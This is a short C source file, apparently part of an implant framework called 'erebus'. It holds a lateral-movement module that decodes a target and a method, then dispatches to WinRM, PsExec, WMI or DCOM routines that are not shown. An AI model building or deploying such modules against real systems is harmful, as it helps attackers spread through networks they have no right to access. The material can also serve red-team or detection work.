#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <string.h>

#include "erebus/lateral_impl.h"
#include "erebus/modules.h"
#include "erebus/pb_modules.h"

int erebus_mod_lateral_move(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    erebus_lateral_config cfg;
    if (!erebus_pb_decode_lateral_config(config, config_len, &cfg)) return 0;

    if (!cfg.target[0]) {
        erebus_pb_free_lateral_config(&cfg);
        return 0;
    }
    if (!cfg.method[0]) {
        snprintf(cfg.method, sizeof(cfg.method), "winrm");
    }

    int success = 0;
    char output[65536];
    output[0] = '\0';

    if (strcmp(cfg.method, "winrm") == 0) {
        erebus_lateral_winrm(&cfg, output, sizeof(output), &success);
    } else if (strcmp(cfg.method, "psexec") == 0) {
        erebus_lateral_psexec(&cfg, output, sizeof(output), &success);
    } else if (strcmp(cfg.method, "wmi") == 0) {
        erebus_lateral_wmi(&cfg, output, sizeof(output), &success);
    } else if (strcmp(cfg.method, "dcom") == 0) {
        erebus_lateral_dcom(&cfg, output, sizeof(output), &success);
    } else {
        snprintf(output, sizeof(output),
            "unknown lateral method '%s' (supported: winrm, psexec, wmi, dcom)", cfg.method);
        success = 0;
    }

    int ok = erebus_pb_encode_lateral_result(cfg.method, cfg.target, success, output, out, out_len);
    erebus_pb_free_lateral_config(&cfg);
    return ok;
}
